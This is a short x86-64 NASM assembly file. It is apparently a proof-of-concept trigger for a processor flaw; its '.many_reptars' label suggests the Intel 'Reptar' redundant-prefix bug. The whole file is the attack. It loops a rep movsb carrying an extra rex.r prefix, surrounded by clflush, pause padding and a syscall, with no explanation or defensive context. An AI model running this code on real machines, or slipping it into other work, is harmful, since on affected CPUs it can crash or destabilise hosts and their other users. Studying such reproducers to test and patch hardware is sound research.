BITS 64

global _start

section .text
    _start:
        mov eax, 24 ; yield
        jmp .suffix
        .attack:
        mov eax, 60 ; exit
        xor ecx, ecx; clear ecx
        lea rsi, [rsp+1]
        mov rdi, rsi
        .many_reptars:
        %rep 1
            align 0x1000
            ; 16 bytes
            times 4 nop ; 4 bytes
            dec rsi     ; 3 bytes
            dec rdi     ; 3 bytes
            inc rbx     ; 3 bytes
            inc rcx     ; 3 bytes
            ; 16 bytes
            clflush [rdi]    ; 3 bytes
            clflush [rsi+64] ; 4 bytes
            mov [rsp], rbx   ; 4 bytes
            rep              ; 1 byte
            db 0x44; rex.r   ; 1 byte
            movsb            ; 1 byte
            rep              ; 1 byte
            nop              ; 1 byte
        %endrep
        .suffix:
        align 0x1000
        times 0x1000*8 rep pause
        .exit:
        mov dil, bl ; counter
        syscall
        jmp .attack
